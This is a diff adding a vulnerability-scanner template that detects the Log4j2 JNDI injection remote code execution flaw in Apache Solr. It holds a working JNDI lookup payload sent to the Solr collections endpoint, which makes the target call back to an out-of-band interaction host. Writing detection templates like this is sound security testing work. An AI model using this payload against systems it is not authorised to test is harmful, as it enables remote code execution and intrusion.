@@ -1,0 +1,28 @@
+id: apache-solr-log4j2-rce
+
+info:
+  name: Apache Solr Log4j2 RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Apache Solr has a Log4j2 JNDI injection vulnerability which allows an attacker to execute remote code by sending a specially crafted request to the Solr collections endpoint.
+  classification:
+    cvss-score: 10.0
+  tags: log4j2,rce,solr
+
+http:
+  - raw:
+      - |
+        GET /solr/admin/collections?action=${jndi:ldap://{{interactsh-url}}} HTTP/1.1
+        Host: {{Hostname}}
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
